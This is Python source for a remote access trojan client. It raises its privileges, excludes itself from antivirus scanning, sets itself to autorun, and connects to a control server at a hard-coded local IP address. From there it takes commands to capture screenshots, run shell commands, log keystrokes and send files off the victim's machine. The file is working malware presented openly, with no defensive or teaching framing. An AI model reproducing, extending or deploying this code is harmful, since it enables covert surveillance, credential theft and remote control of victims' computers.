import socket
from utils import *
from pynput import keyboard
from elevate import elevate
import sys

from autorun import autorun
from antivirus import exclude_path_antivirus

elevate()

exclude_path_antivirus()
autorun()


SCREENSHOT = 'screenshot'
KEYLOG = 'keylog'

addr = ("192.168.0.185", 8000)
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ss.connect(addr)
print('connected..')


def send_to_server(data_to_send: bytes) -> None:
    chunk_size = 1024
    step = 0
    while step * chunk_size < len(data_to_send):
        start = step * chunk_size
        end = min(start + chunk_size, len(data_to_send))
        chunk = data_to_send[start:end]
        ss.sendall(chunk)
        step += 1
        print(chunk)


while True:
    try:
        command = ss.recv(1024).decode().strip().lower()
        print("Received command:", command)
        if command == SCREENSHOT:
            data_to_send = save_screenshot()
            send_to_server(data_to_send["bytes"])
            delete_file(data_to_send["path"])
            continue
        elif command.startswith('exec'):
            req = command.strip("exec").strip()
            parts = req.split()
            try:
                if parts[0] == 'cd':
                    if len(parts) == 2:
                        handle_dir(parts[1])
                        ss.send(f'changed dir to {parts[1]}'.encode())
                    elif len(parts) == 1:
                        handle_dir(parts[0])
                        ss.send(f'changed dir to {parts[0]}'.encode())
                else:
                    send_to_server(exec_command(req))
            except Exception as err:
                print(err)
                continue
        elif command.startswith(KEYLOG):
            try:
                req = int(command.strip("keylog").strip())

                filename = random_name() + '.txt'
                pathname = make_temp_path()

                pathname = os.path.join(pathname, filename)
                file = open(pathname, "w")

                def onPress(key):
                    global req
                    print(req)
                    print(str(key))

                    stroke = str(key).replace("'", "")

                    if req == 0:
                        try:
                            file.close()
                            send_to_server(byte_represent(pathname))
                            delete_file(pathname)
                            sys.exit()
                        except ValueError as e:
                            print(e)
                            return

                    if str(key) == "Key.space":
                        file.write(" ")
                    elif str(key) == "Key.enter":
                        file.write("\n")
                    elif str(key) == "Key.esc":
                        file.write(" ")
                    elif str(key) == "Key.backspace":
                        try:
                            file.seek(file.tell() - 1, os.SEEK_SET)
                            file.write("")
                        except ValueError as e:
                            pass
                            print(1)
                    else:
                        file.write(stroke)

                    req -= 1

                with keyboard.Listener(on_press=onPress) as listener:
                    listener.join()

            except Exception as err:
                print(err)
                continue

        elif command.startswith('download'):
            path = command.strip("download").strip()
            try:
                data = byte_represent(path)
                if data:
                    send_to_server(data)
                continue
            except PermissionError as err:
                print(err)
                continue

        else:
            sys.exit(0)
    except socket.error:
        sys.exit(0)
